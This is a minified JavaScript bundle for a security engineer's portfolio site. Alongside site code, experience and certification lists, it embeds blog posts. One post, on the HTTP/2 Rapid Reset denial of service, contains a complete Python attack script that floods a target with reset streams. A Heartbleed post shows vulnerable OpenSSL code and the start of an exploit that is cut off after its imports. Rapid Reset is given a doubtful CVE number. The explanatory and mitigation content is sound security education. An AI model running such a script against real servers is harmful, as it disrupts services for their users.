0&&(s=null),e==null){var i;if(!t)return null;if(t.errors)e=t.matches;else if((i=s)!=null&&i.v7_partialHydration&&n.length===0&&!t.initialized&&t.matches.length>0)e=t.matches;else return null}let a=e,l=(r=t)==null?void 0:r.errors;if(l!=null){let u=a.findIndex(d=>d.route.id&&(l==null?void 0:l[d.route.id])!==void 0);u>=0||ie(!1),a=a.slice(0,Math.min(a.length,u+1))}let o=!1,c=-1;if(t&&s&&s.v7_partialHydration)for(let u=0;u<a.length;u++){let d=a[u];if((d.route.HydrateFallback||d.route.hydrateFallbackElement)&&(c=u),d.route.id){let{loaderData:h,errors:y}=t,k=d.route.loader&&h[d.route.id]===void 0&&(!y||y[d.route.id]===void 0);if(d.route.lazy||k){o=!0,c>=0?a=a.slice(0,c+1):a=[a[0]];break}}}return a.reduceRight((u,d,h)=>{let y,k=!1,x=null,L=null;t&&(y=l&&d.route.id?l[d.route.id]:void 0,x=d.route.errorElement||og,o&&(c<0&&h===0?(yg("route-fallback"),k=!0,L=null):c===h&&(k=!0,L=d.route.hydrateFallbackElement||null)));let p=n.concat(a.slice(0,h+1)),f=()=>{let m;return y?m=x:k?m=L:d.route.Component?m=C.createElement(d.route.Component,null):d.route.element?m=d.route.element:m=u,C.createElement(ug,{match:d,routeContext:{outlet:u,matches:p,isDataRoute:t!=null},children:m})};return t&&(d.route.ErrorBoundary||d.route.errorElement||h===0)?C.createElement(cg,{location:t.location,revalidation:t.revalidation,component:x,error:y,children:f(),routeContext:{outlet:null,matches:p,isDataRoute:!0}}):f()},null)}var Sd=function(e){return e.UseBlocker="useBlocker",e.UseRevalidator="useRevalidator",e.UseNavigateStable="useNavigate",e}(Sd||{}),_d=function(e){return e.UseBlocker="useBlocker",e.UseLoaderData="useLoaderData",e.UseActionData="useActionData",e.UseRouteError="useRouteError",e.UseNavigation="useNavigation",e.UseRouteLoaderData="useRouteLoaderData",e.UseMatches="useMatches",e.UseRevalidator="useRevalidator",e.UseNavigateStable="useNavigate",e.UseRouteId="useRouteId",e}(_d||{});function dg(e){let n=C.useContext(io);return n||ie(!1),n}function hg(e){let n=C.useContext(ng);return n||ie(!1),n}function fg(e){let n=C.useContext(Wn);return n||ie(!1),n}function Ed(e){let n=fg(),t=n.matches[n.matches.length-1];return t.route.id||ie(!1),t.route.id}function mg(){var e;let n=C.useContext(wd),t=hg(),s=Ed();return n!==void 0?n:(e=t.errors)==null?void 0:e[s]}function gg(){let{router:e}=dg(Sd.UseNavigateStable),n=Ed(_d.UseNavigateStable),t=C.useRef(!1);return kd(()=>{t.current=!0}),C.useCallback(function(r,i){i===void 0&&(i={}),t.current&&(typeof r=="number"?e.navigate(r):e.navigate(r,Is({fromRouteId:n},i)))},[e,n])}const Lc={};function yg(e,n,t){Lc[e]||(Lc[e]=!0)}function vg(e,n){e==null||e.v7_startTransition,e==null||e.v7_relativeSplatPath}function kn(e){ie(!1)}function wg(e){let{basename:n="/",children:t=null,location:s,navigationType:r=An.Pop,navigator:i,static:a=!1,future:l}=e;$s()&&ie(!1);let o=n.replace(/^\/*/,"/"),c=C.useMemo(()=>({basename:o,navigator:i,static:a,future:Is({v7_relativeSplatPath:!1},l)}),[o,l,i,a]);typeof s=="string"&&(s=$t(s));let{pathname:u="/",search:d="",hash:h="",state:y=null,key:k="default"}=s,x=C.useMemo(()=>{let L=ro(u,o);return L==null?null:{location:{pathname:L,search:d,hash:h,state:y,key:k},navigationType:r}},[o,u,d,h,y,k,r]);return x==null?null:C.createElement(ut.Provider,{value:c},C.createElement(Ei.Provider,{children:t,value:x}))}function kg(e){let{children:n,location:t}=e;return ig(Za(n),t)}new Promise(()=>{});function Za(e,n){n===void 0&&(n=[]);let t=[];return C.Children.forEach(e,(s,r)=>{if(!C.isValidElement(s))return;let i=[...n,r];if(s.type===C.Fragment){t.push.apply(t,Za(s.props.children,i));return}s.type!==kn&&ie(!1),!s.props.index||!s.props.children||ie(!1);let a={id:s.props.id||i.join("-"),caseSensitive:s.props.caseSensitive,element:s.props.element,Component:s.props.Component,index:s.props.index,path:s.props.path,loader:s.props.loader,action:s.props.action,errorElement:s.props.errorElement,ErrorBoundary:s.props.ErrorBoundary,hasErrorBoundary:s.props.ErrorBoundary!=null||s.props.errorElement!=null,shouldRevalidate:s.props.shouldRevalidate,handle:s.props.handle,lazy:s.props.lazy};s.props.children&&(a.children=Za(s.props.children,i)),t.push(a)}),t}/**
 * React Router DOM v6.30.2
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function Ja(){return Ja=Object.assign?Object.assign.bind():function(e){for(var n=1;n<arguments.length;n++){var t=arguments[n];for(var s in t)Object.prototype.hasOwnProperty.call(t,s)&&(e[s]=t[s])}return e},Ja.apply(this,arguments)}function bg(e,n){if(e==null)return{};var t={},s=Object.keys(e),r,i;for(i=0;i<s.length;i++)r=s[i],!(n.indexOf(r)>=0)&&(t[r]=e[r]);return t}function xg(e){return!!(e.metaKey||e.altKey||e.ctrlKey||e.shiftKey)}function Sg(e,n){return e.button===0&&(!n||n==="_self")&&!xg(e)}const _g=["onClick","relative","reloadDocument","replace","state","target","to","preventScrollReset","viewTransition"],Eg="6";try{window.__reactRouterVersion=Eg}catch{}const Tg="startTransition",Nc=mh[Tg];function Cg(e){let{basename:n,children:t,future:s,window:r}=e,i=C.useRef();i.current==null&&(i.current=Pm({window:r,v5Compat:!0}));let a=i.current,[l,o]=C.useState({action:a.action,location:a.location}),{v7_startTransition:c}=s||{},u=C.useCallback(d=>{c&&Nc?Nc(()=>o(d)):o(d)},[o,c]);return C.useLayoutEffect(()=>a.listen(u),[a,u]),C.useEffect(()=>vg(s),[s]),C.createElement(wg,{basename:n,children:t,location:l.location,navigationType:l.action,navigator:a,future:s})}const Pg=typeof window<"u"&&typeof window.document<"u"&&typeof window.document.createElement<"u",Ag=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,_t=C.forwardRef(function(n,t){let{onClick:s,relative:r,reloadDocument:i,replace:a,state:l,target:o,to:c,preventScrollReset:u,viewTransition:d}=n,h=bg(n,_g),{basename:y}=C.useContext(ut),k,x=!1;if(typeof c=="string"&&Ag.test(c)&&(k=c,Pg))try{let m=new URL(window.location.href),S=c.startsWith("//")?new URL(m.protocol+c):new URL(c),T=ro(S.pathname,y);S.origin===m.origin&&T!=null?c=T+S.search+S.hash:x=!0}catch{}let L=tg(c,{relative:r}),p=Lg(c,{replace:a,state:l,target:o,preventScrollReset:u,relative:r,viewTransition:d});function f(m){s&&s(m),m.defaultPrevented||p(m)}return C.createElement("a",Ja({},h,{href:k||L,onClick:x||i?s:f,ref:t,target:o}))});var Rc;(function(e){e.UseScrollRestoration="useScrollRestoration",e.UseSubmit="useSubmit",e.UseSubmitFetcher="useSubmitFetcher",e.UseFetcher="useFetcher",e.useViewTransitionState="useViewTransitionState"})(Rc||(Rc={}));var Oc;(function(e){e.UseFetcher="useFetcher",e.UseFetchers="useFetchers",e.UseScrollRestoration="useScrollRestoration"})(Oc||(Oc={}));function Lg(e,n){let{target:t,replace:s,state:r,preventScrollReset:i,relative:a,viewTransition:l}=n===void 0?{}:n,o=bd(),c=Gs(),u=xd(e,{relative:a});return C.useCallback(d=>{if(Sg(d,t)){d.preventDefault();let h=s!==void 0?s:ti(c)===ti(u);o(e,{replace:h,state:r,preventScrollReset:i,relative:a,viewTransition:l})}},[c,o,u,s,r,t,e,i,a,l])}function Ng({onToggleTheme:e,theme:n}){const t=Gs(),s=bd(),r=t.pathname==="/blogs",i=t.pathname.startsWith("/projects"),a=t.pathname.startsWith("/certifications"),l=t.pathname.startsWith("/cve-map"),o=t.hash==="#contact"||t.pathname==="/contact",c=(u,d)=>{u.preventDefault();const h=()=>{const y=document.getElementById(d);y&&y.scrollIntoView({behavior:"smooth",block:"start"})};t.pathname!=="/"?(s("/"),setTimeout(h,80)):h()};return g.jsx("nav",{className:"navbar",children:g.jsxs("div",{className:"container nav-container",children:[g.jsx("div",{className:"logo",children:"Hem Parekh | Security Engineer"}),g.jsxs("ul",{className:"nav-links",children:[g.jsx("li",{children:g.jsx("a",{href:"#about",onClick:u=>c(u,"about"),children:"About"})}),g.jsx("li",{children:g.jsx("a",{href:"#experience",onClick:u=>c(u,"experience"),children:"Experience"})}),g.jsx("li",{children:g.jsx(_t,{to:"/projects",className:i?"active":"",children:"Projects"})}),g.jsx("li",{children:g.jsx(_t,{to:"/certifications",className:a?"active":"",children:"Certs"})}),g.jsx("li",{children:g.jsx(_t,{to:"/blogs",className:r?"active":"",children:"Blog"})}),g.jsx("li",{children:g.jsx(_t,{to:"/cve-map",className:l?"active":"",children:"CVE Map"})}),g.jsx("li",{children:g.jsx("a",{href:"#contact",className:o?"active":"",onClick:u=>c(u,"contact"),children:"Contact"})})]}),g.jsxs("button",{className:"theme-toggle",id:"themeTheme",onClick:e,children:["Theme: ",n==="dark"?"Dark":"Light"]})]})})}function Rg(){return g.jsx("footer",{className:"footer",children:g.jsx("div",{className:"container",children:g.jsx("p",{children:"© 2024 Hem Parekh | All rights reserved."})})})}function Nt({title:e,id:n,children:t}){return g.jsxs("section",{className:"terminal-section",id:n,children:[g.jsx("div",{className:"terminal-header",children:`> ${e.toUpperCase()}`}),g.jsx("div",{className:"terminal-body",children:t}),g.jsx("div",{className:"terminal-divider",children:"------------------------------------------------------------"})]})}const Og=[{href:"https://github.com/Hem1700",icon:"fab fa-github",label:"GitHub"},{href:"https://www.linkedin.com/in/hem-parekh/",icon:"fab fa-linkedin-in",label:"LinkedIn"},{href:"https://medium.com/@hemparekh1596",icon:"fab fa-medium",label:"Medium"},{href:"https://tryhackme.com/r/p/beatmonk",icon:"fas fa-terminal",label:"TryHackMe"},{href:"https://app.hackthebox.com/profile/overview",icon:"fas fa-user-secret",label:"HackTheBox"}],Mc={highlight:"Hem Parekh",blurb:"Security engineer and pen tester building hardened systems, staging exploit labs, and mapping attack surfaces before adversaries do."},Mg={text:"I’m Hem Parekh, a Security Engineer and Pen Tester who thrives on building resilient software and unearthing vulnerabilities. I blend engineering discipline with a hacker’s curiosity to design secure systems and to stress-test the ones that already exist. When I’m not pulling threads on a bug, I’m writing up what I find so other defenders can move faster."},Ig=[{range:"Mar 2025 - Present",role:"Privacy Engineer",org:"Amazon",desc:"Driving privacy-by-design reviews and mitigating data exposure risks across services; partnering with engineering teams to embed controls and streamline compliance."},{range:"May 2024 - Dec 2024",role:"Cybersecurity Engineer Intern",org:"Toshiba Global Commerce Solution",desc:"Conducted penetration testing on over 25 web applications, identifying critical vulnerabilities, automating processes, and improving operational efficiency."},{range:"Jan 2023 - Aug 2023",role:"Research Assistant",org:"Rochester Institute of Technology",desc:"Applied knowledge of security standards, including NIST SP 800-53 and ISO/IEC 27001, conducting risk assessments and implementing controls to mitigate risks effectively."},{range:"Sep 2023 - May 2024",role:"Cybersecurity Analyst Intern",org:"Langan Engineering and Environmental Services",desc:"Conducted vulnerability assessments and penetration tests across 18 internal systems, contributing to enterprise security and developing NIST-27001-compliant documentation."},{range:"June 2021 - July 2022",role:"Security Operational Analyst (SOC)",org:"RNS Technology",desc:"Monitored 100+ security devices, responded to threat alerts, and conducted root cause analyses to enhance system security and data integrity."}],zg=[{title:"Phish Analyzer Tool",description:"A patented desktop application designed to analyze and secure against phishing emails, featuring sandbox configurations, advanced security mechanisms, and a user-friendly interface to enhance threat detection and response.",href:"https://github.com/Hem1700/sita",tags:["Security","Desktop"]},{title:"Secure Communication Using Image Exif Data",description:"Explored the innovative use of image Exif data for covert communication. Developed methodologies for securely embedding and transmitting sensitive information through image metadata.",href:"https://drive.google.com/file/d/1WcmhCJQN_b8jad3dQoGplBmO6EN1leYZ/view?usp=sharing",tags:["Research","Security"]},{title:"Architecture and Advancement in Virtualization of TPM",description:"Explored the architecture and advancements of virtual Trusted Platform Modules (vTPMs) in virtual and cloud environments. The project highlighted security flaws, key-sharing mechanisms, and the migration challenges associated with vTPMs, proposing solutions for enhanced security and trust in virtualization.",href:"https://drive.google.com/file/d/1Y2vyRjVBgjy6QB9_qn_taJUrYCodehHT/view?usp=sharing",tags:["Research","Cloud"]},{title:"Quantum Key Distribution",description:"This project delves into the rapidly evolving field of quantum cryptography, focusing on Quantum Key Distribution (QKD). It explores innovative methods to increase QKD transmission distance while maintaining secure data transmission, addressing challenges such as key generation rates, distance limitations, and potential vulnerabilities.",href:"https://drive.google.com/file/d/17vZRyJyKYX7CmUgC1iBQf4buEsBgoC30/view?usp=sharing",tags:["Research","Cryptography"]},{title:"SecTool: The Comprehensive Cybersecurity Toolkit",description:"SecTool is a versatile cybersecurity toolkit with features like keylogging, OSINT, payload generation, hash cracking, network analysis, social engineering tools, web vulnerability detection, and more. It’s a comprehensive solution for security testing and digital defense.",href:"https://github.com/Hem1700/sectool",tags:["Security","Toolkit"]},{title:"Website Crawler",description:"A lightweight and efficient web crawler designed to scrape, analyze, and extract data from websites, enabling seamless data collection for various use cases.",href:"https://github.com/Hem1700/Website-crawler",tags:["Web","Automation"]}],Dg=[{title:"CompTIA Security+",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/7270d02f-a0d1-483a-8000-8ebd2b628391/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Pentest+",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/d93ed2a7-c86b-42ec-b4e4-7a7d2a2cd972/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA CySA+",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/d6a9802e-23b8-4a0a-83e1-edc7e89a457c/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Network Vulnerability Assessment Professional (CVNP)",details:"Issued Oct 2024 by CompTIA - Expires Oct 2027",href:"https://www.credly.com/badges/59404c7e-7680-45a9-8622-2a76f603c0c7/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Security Analytics Professional (CSAP)",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/8c6cca3e-0eb1-4920-8eff-826998743336/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"CompTIA Network Security Professional (CNSP)",details:"Issued Nov 2024 by CompTIA - Expires Nov 2027",href:"https://www.credly.com/badges/08f2dd46-295b-402c-bc67-29189bea83ff/linked_in_profile",domain:"Security",issuer:"CompTIA"},{title:"ICS2 Certified in Cybersecurity (CC)",details:"Issued Oct 2024 - Expires Oct 2027",href:"https://www.credly.com/badges/c16c4d43-1e84-44ab-bebe-38d747073ccb/linked_in_profile",domain:"Security",issuer:"ISC2"},{title:"AWS Certified Cloud Practitioner (CCP)",details:"Issued Mar 2024 - Expires Mar 2027",href:"https://www.credly.com/badges/6a0d691b-b3b2-4d44-addb-f2b5b171e83d/linked_in_profile",domain:"Cloud",issuer:"AWS"},{title:"Microsoft Azure Security, Compliance and Identity Fundamentals (SC-900)",details:"Issued Sep 2024 by Microsoft - No expiration",href:"https://learn.microsoft.com/api/credentials/share/en-us/HemParekh-9873/BD2B5E59D28A7F54?sharingId=1D33B191273E7834",domain:"Cloud",issuer:"Microsoft"},{title:"Microsoft Azure Fundamentals (AZ-900)",details:"Issued Sep 2024 by Microsoft - No expiration",href:"https://learn.microsoft.com/api/credentials/share/en-gb/HemParekh-9873/8B3B97F4E45B9F2C?sharingId",domain:"Cloud",issuer:"Microsoft"},{title:"CCNA: Introduction to Networks",details:"Issued Jun 2020 by Cicso - No expiration",href:"https://www.credly.com/badges/be753401-bd44-4d09-81d7-33af049e6fad/linked_in_profile",domain:"Networking",issuer:"Cisco"},{title:"Cisco: Endpoint Security",details:"Issued Nov 2024 by Cicso - No expiration",href:"https://www.credly.com/badges/9e4309a6-089f-4259-8333-c9c501666c77/linked_in_profile",domain:"Security",issuer:"Cisco"}],ao=[{slug:"kernel_surface_audit_blog",title:"Who Can Touch Your Kernel? Auditing /boot/vmlinuz-* on Linux",href:"/blog/kernel_surface_audit_blog",excerpt:"A defender’s walkthrough on who should vs. who can modify your kernel image, dangerous root patterns, and a Python-based audit checklist to watch /boot/vmlinuz-*.",date:"December 8, 2025",readTime:"7 min read"},{slug:"cve-2022-26318-re-blog",title:"Reverse-Engineering CVE-2022-26318 (WatchGuard Firebox/XTM): From Network Trace to Root Cause (Non-Weaponized)",href:"/blog/cve-2022-26318-re-blog",excerpt:"Defender-focused RE of CVE-2022-26318: how the /agent/login path reaches wgagent, SAX parsing overflow mechanics, watchpoint-driven proof, and patch/detection guidance without weaponized details.",date:"December 28, 2025",readTime:"10 min read"},{slug:"react2shell-toy-lab",title:'From React2Shell to Toy Labs: Understanding Insecure Deserialization with a Tiny "Fake Flight" Server',href:"/blog/react2shell-toy-lab",excerpt:'Build a tiny "fake Flight" Node lab to see how insecure deserialization and thenable handling can lead to RCE, plus a safer variant and takeaways that mirror React2Shell.',date:"December 8, 2025",readTime:"8 min read"},{slug:"transient_scheduler_attacks_tsa_blog",title:"Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak",href:"/blog/transient_scheduler_attacks_tsa_blog",excerpt:"AMD’s new TSA class abuses false completions in the instruction scheduler to leak data across privilege boundaries. Here’s what TSA is, how an attacker could exploit it, a tiny timing lab to feel the leak, and what defenders should do.",date:"December 4, 2025",readTime:"8 min read"},{slug:"firmware_llm_annotator",title:"Firmware Exploration: LLM as Your Annotator",href:"/blog/firmware_llm_annotator",excerpt:"How to use an LLM as a helper for firmware reversing: triaging strings, summarizing decompiled functions, and annotating config blobs while you stay in control of the analysis.",date:"November 30, 2025",readTime:"5 min read"},{slug:"1001",title:"CVE-2024–1001",href:"/blog/1001",excerpt:"Kubernetes relies heavily on Role-Based Access Control (RBAC) to manage permissions. However, in early 2024, CVE-2024–1001 was disclosed, revealing how misconfigured RBAC rules in Kubernetes could allow attackers to gain full control over a cluster. This vulnerability emphasizes the risks of poorly defined access policies.",date:"September 8, 2024",readTime:"3 min read"},{slug:"0012",title:"CVE-2024–0012",href:"/blog/0012",excerpt:"CVE-2024–0012, known as the HTTP/2 Rapid Reset Attack, was disclosed, affecting major web servers like Apache and Nginx. This denial-of-service (DoS) vulnerability exploits HTTP/2’s stream management system by abusing the RST_STREAM frame. By overwhelming the server with rapid stream resets, attackers can exhaust resources and disrupt services.",date:"September 8, 2024",readTime:"3 min read"},{slug:"40982",title:"CVE-2022–40982",href:"/blog/40982",excerpt:"A critical vulnerability, CVE-2022–40982, dubbed Downfall, was disclosed. This vulnerability affects Intel x86–64 processors and exploits speculative execution to access sensitive data stored in vector registers. It impacts both consumer CPUs and server-grade Xeon processors, allowing attackers with local access to bypass security boundaries and potentially extract confidential information like encryption keys or passwords.",date:"September 8, 2024",readTime:"3 min read"},{slug:"cow",title:"CVE-2016–5195",href:"/blog/cow",excerpt:"In 2016, a critical vulnerability in the Linux kernel, known as Dirty Cow (CVE-2016–5195), was disclosed. This privilege escalation flaw exploited a race condition in the kernel’s memory management system, allowing attackers to write to read-only memory mappings. The name “Dirty Cow” comes from its exploitation of the Copy-On-Write (COW) mechanism in Linux.",date:"September 8, 2024",readTime:"3 min read"},{slug:"symlinks",title:"Symbolic Links (Symlinks) in Linux",href:"/blog/symlinks",excerpt:"TIn Linux, symbolic links are essentially shortcuts that point to other files or directories. They allow you to reference a file or directory without duplicating its contents. To know more read the blog.",date:"September 8, 2024",readTime:"3 min read"},{slug:"23397",title:"CVE-2023–23397",href:"/blog/23397",excerpt:"This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.",date:"September 8, 2024",readTime:"3 min read"},{slug:"0160",title:"CVE-2014-0160",href:"/blog/0160",excerpt:"Heartbleed’s simplicity and devastating impact exposed the internet’s underlying fragility, and despite extensive efforts to patch affected systems, its ghost still haunts forgotten and neglected systems today. Let’s explore the technical details of this vulnerability, the global chaos it caused, and why it’s still relevant.",date:"September 8, 2024",readTime:"3 min read"},{slug:"11882",title:"CVE-2017-11882",href:"/blog/11882",excerpt:"One of the most notorious among these is CVE-2017–11882, commonly known as the Microsoft Office Memory Corruption Vulnerability. Originating in 2000, this vulnerability remains a frequently exploited entry point for attackers worldwide, from nation-state actors to cyber criminals.",date:"October 26 2024",readTime:"3 min read"},{slug:"robot",title:"ROBOT (Return of Bleichenbacher’s Oracle Threat) Attack",href:"/blog/robot",excerpt:"This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.",date:"September 8, 2024",readTime:"3 min read"},{slug:"poodle",title:"ZOMBIE POODLE and GOLDENDOODLE ATTACKS",href:"/blog/poodle",excerpt:"This blog provides an in-depth look at Zombie Poodle and Goldendoodle attacks, how they work, and their implications for modern cybersecurity.",date:"September 6, 2024",readTime:"6 min read"}];function Ic(){return g.jsxs("div",{className:"terminal-feed",children:[g.jsx(Nt,{title:"home",children:g.jsx("pre",{className:"terminal-block",children:`user: ${Mc.highlight}
roles: Security Engineer | Pen Tester | Threat Hunter
bio: ${Mc.blurb}`})}),g.jsx(Nt,{title:"experience",id:"experience",children:g.jsx("ul",{className:"terminal-list",children:Ig.map(e=>g.jsxs("li",{children:[e.role," @ ",e.org," [",e.range,"]"]},`${e.role}-${e.range}`))})}),g.jsxs(Nt,{title:"about",id:"about",children:[g.jsx("p",{className:"terminal-text",children:Mg.text}),g.jsx("div",{className:"terminal-list inline",children:Og.map(e=>g.jsx("a",{href:e.href,target:"_blank",rel:"noreferrer",children:e.label},e.href))})]})]})}function jg(){return g.jsx("div",{className:"terminal-feed",children:g.jsx(Nt,{title:"blogs",children:g.jsx("ul",{className:"terminal-list",children:ao.map(e=>g.jsxs("li",{children:[g.jsx(_t,{to:`/blog/${e.slug}`,children:e.title})," — ",e.excerpt]},e.slug))})})})}const Bg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2024–0012: HTTP/2 Rapid Reset Attack Explained</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2024–0012: HTTP/2 Rapid Reset Attack Explained</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2024–0012?</h2>
        <p>
          CVE-2024–0012, known as the HTTP/2 Rapid Reset Attack, was disclosed, affecting major web servers like Apache and Nginx. This denial-of-service (DoS) vulnerability exploits HTTP/2’s stream management system by abusing the RST_STREAM frame. By overwhelming the server with rapid stream resets, attackers can exhaust resources and disrupt services.
        </p>

        <h2>How the Vulnerability Works</h2>
        <h3>HTTP/2 and RST_STREAM</h3>
        <p>
          HTTP/2 allows multiplexing multiple streams over a single connection. The RST_STREAM frame cancels streams when they are no longer needed. However, attackers can send a rapid series of RST_STREAM frames, forcing the server to process and discard streams at an unsustainable rate, leading to resource exhaustion.
        </p>

        <h2>Exploit Code Example</h2>
        <p>
          Below is an educational example in Python that demonstrates how an attacker could exploit this vulnerability using an HTTP/2 library.
        </p>
        <div class="code-block">
          <code>
import h2.connection<br>
import h2.events<br>
import socket<br>
import ssl<br>
import time<br><br>

# Configure target server<br>
TARGET_HOST = "vulnerable-server.com"<br>
TARGET_PORT = 443<br>
STREAM_COUNT = 1000  # Number of streams to abuse<br><br>

def send_reset_attack():<br>
    # Establish SSL/TLS connection<br>
    context = ssl.create_default_context()<br>
    with socket.create_connection((TARGET_HOST, TARGET_PORT)) as raw_sock:<br>
        with context.wrap_socket(raw_sock, server_hostname=TARGET_HOST) as tls_sock:<br>
            # Initialize HTTP/2 connection<br>
            conn = h2.connection.H2Connection()<br>
            conn.initiate_connection()<br>
            tls_sock.sendall(conn.data_to_send())<br><br>

            # Send multiple streams with rapid resets<br>
            for stream_id in range(1, STREAM_COUNT * 2, 2):  # HTTP/2 streams are odd-numbered<br>
                conn.send_headers(<br>
                    stream_id=stream_id,<br>
                    headers=[<br>
                        (":method", "GET"),<br>
                        (":path", "/"),<br>
                        (":authority", TARGET_HOST),<br>
                        (":scheme", "https"),<br>
                    ],<br>
                )<br>
                tls_sock.sendall(conn.data_to_send())<br>
                conn.reset_stream(stream_id)<br>
                tls_sock.sendall(conn.data_to_send())<br>
                print(f"Stream {stream_id} reset sent")<br>
            time.sleep(5)<br><br>

if __name__ == "__main__":<br>
    print(f"Launching HTTP/2 Rapid Reset Attack on {TARGET_HOST}...")<br>
    send_reset_attack()<br>
    print("Attack complete. Check server performance.")<br>
          </code>
        </div>
        <p><strong>Disclaimer:</strong> This code is for educational purposes only. Testing such exploits without proper authorization is unethical and illegal.</p>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Apply Server Patches:</strong> Server vendors like Apache and Nginx have released patches to mitigate this vulnerability. Update your software to the latest version.</li>
          <li><strong>Implement Rate-Limiting:</strong> Use rate-limiting to restrict the number of HTTP/2 streams and resets per connection.</li>
          <li><strong>Monitor Server Metrics:</strong> Deploy monitoring tools to detect unusual spikes in resource usage associated with HTTP/2 traffic.</li>
          <li><strong>Disable HTTP/2 Temporarily:</strong> If patching is not feasible, disable HTTP/2 support as a temporary mitigation:
            <ul>
              <li><strong>For Apache:</strong> Remove <code>h2</code> from the <code>Protocols</code> directive:</li>
              <code>Protocols h2 h2c http/1.1</code>
              <li><strong>For Nginx:</strong> Remove the <code>http2</code> directive from server configurations.</li>
            </ul>
          </li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          CVE-2024–0012, or the HTTP/2 Rapid Reset Attack, underscores the importance of securing web servers against denial-of-service attacks. By applying timely patches, implementing rate-limiting, and monitoring server activity, organizations can mitigate this threat and ensure the availability of their services.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Fg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Heartbleed (CVE-2014–0160)</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Heartbleed (CVE-2014–0160)</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>Understanding Heartbleed: A Technical Breakdown</h2>
        <p>
          Heartbleed was a flaw in the heartbeat extension of OpenSSL, a widely used library that provides SSL/TLS encryption. The vulnerability was introduced in OpenSSL version 1.0.1 and persisted until version 1.0.1g. The issue stemmed from improper input validation, allowing an attacker to read arbitrary chunks of server memory, up to 64KB per request.
        </p>

        <h3>Heartbeat Extension Basics</h3>
        <p>
          To maintain secure connections, OpenSSL’s heartbeat mechanism allows clients and servers to verify each other’s presence by sending and receiving “heartbeat” messages. Here’s how the message exchange is supposed to work:
        </p>
        <ol>
          <li>A client sends a heartbeat request containing a payload and specifies the payload length.</li>
          <li>The server echoes the payload back to the client to confirm the connection is still alive.</li>
        </ol>
        <p>
          The vulnerability occurs because the server trusts the client-supplied payload length without verifying it against the actual payload size, leading to memory leaks.
        </p>

        <h3>Simplified Vulnerable Code</h3>
        <div class="code-block">
          <code>
int tls1_process_heartbeat(SSL *s) {<br />
&nbsp;&nbsp;unsigned char *p = &s->s3->rrec.data[0];<br />
&nbsp;&nbsp;unsigned short payload;<br />
&nbsp;&nbsp;unsigned char *buffer, *bp;<br />
&nbsp;&nbsp;payload = (p[0] << 8) | p[1];<br />
&nbsp;&nbsp;buffer = OPENSSL_malloc(1 + 2 + payload + 16);<br />
&nbsp;&nbsp;bp = buffer;<br />
&nbsp;&nbsp;*bp++ = TLS1_HB_RESPONSE;<br />
&nbsp;&nbsp;memcpy(bp, p, payload); // Vulnerable<br />
&nbsp;&nbsp;ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload);<br />
&nbsp;&nbsp;OPENSSL_free(buffer);<br />
}
          </code>
        </div>

        <h2>How Heartbleed Works</h2>
        <p>
          An attacker can exploit this vulnerability by sending a malicious heartbeat request where the payload length is intentionally larger than the actual payload.
        </p>

        <h3>Exploit Example in Python</h3>
        <div class="code-block">
          <code>
import socket<br />
import struct<br />
